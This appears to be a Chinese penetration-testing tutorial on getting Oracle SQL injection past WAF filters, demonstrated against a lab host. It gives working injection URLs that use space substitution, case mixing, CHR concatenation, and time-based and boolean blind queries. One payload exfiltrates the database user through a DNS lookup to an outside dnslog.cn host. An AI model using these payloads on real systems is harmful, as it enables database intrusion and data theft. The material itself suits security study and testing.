## 0x02 bypass概念

bypass即绕过，分流。在渗透测试中，发现某漏洞存在但是因为waf、代码层面过滤等安全措施导致无法利用，这种时候，通过编码、大小写、双写等方式绕过安全防护的手法，我们常称之为bypass。

## 0x04 bypass

### 1、空格替换

以?id=1 and 1=1为例，fuzz可以替换空格的常见字符

![](../Images/4169bf16267f2f45ce7ade6f8a169b1e.png)

  

%2d、%2e不报错，但是无信息返回

  

![](../Images/955b39ffdc769fb2f5c85526caf60a75.png)

  

%0a、%0b、%2b、%0c、%0d、%00、%20、%09  
数据正常返回，可以替换

![](../Images/141cef878643b50f48ac5e5446bd6ab8.png)

  

其他字符如/\**/、/*60001*/、/*!\*/、+、()也可以替换空格  

![](../Images/d55ea3bd31ee633a50ddde6c287c7ae7.png)

![](../Images/9b2a836c436a3077903b3e3e87bb7074.png)

### 2、大小写替换

对关键字进行大小写随机替换

```
http://192.168.150.6/oracle.php?id=-1 uNIon ALl sELEct 1,'2',(SelEct uSEr fROm test wHEre id=1) fROm dUAl --
```

  

![](../Images/3f762fc520ee81785746d048714aac14.png)

### 3、拼接换行回车符

Oracle中用CHR(10)表示换行、CHR(13)表示回车、字符串拼接使用||，那么回车换行即是chr(13)||chr(10)。

只要是select *from XXX中的*都可以拼接回车或换行，\*不限于列名、字段名、正常字符串。如下图在user前拼接回车符

```
http://192.168.150.6/oracle.php?id=-1 uNIon ALl sELEct 1,'2',(SelEct chr(13)||uSEr fROm test wHEre id=1) fROm dUAl --

```

![](../Images/58b6dbefb088baf2eaca3537d8e446af.png)

在之后拼接也是可以的  

![](../Images/0c38787dba036de88aadffbe2f716718.png)

### 4、替换注入方法&结合替换

有的时候，真的一直无法显错注入、报错注入，这种时候，不妨试试盲注，虽然盲注获取数据难，耗费时间长，但是注入成功率却比显错、报错更高。  
下面是通过延时盲注，加前面的%00替换空格，成功bypass

```
http://192.168.150.6/oracle.php?id=1 and%001=(select decode(substr(user,1,1),'S',dbms\_pipe.receive\_message('o',5),0) from dual) --
```

  

![](../Images/82ba90af79cd9b218e0d9abd9757ca36.png)

  

同样的，布尔盲注也成功bypass

http://192.168.150.6/oracle.php?id=1 and%001=(select decode(user,'SYSTEM',1,0) from dual) --

http://192.168.150.6/oracle.php?id=1 and%001=(select decode(user,'SYSTEM1',1,0) from dual) --

![](../Images/f46bc9fb516dad10054eb17172a6cca0.png)

![](../Images/fe945e885c8f0033f90761d9fa191825.png)

```
http://192.168.150.6/oracle.php?id=1 and%00(select utl\_inaddr.get\_host\_address((select user from dual)||'.nm0se5.dnslog.cn') from dual)is not null --
```
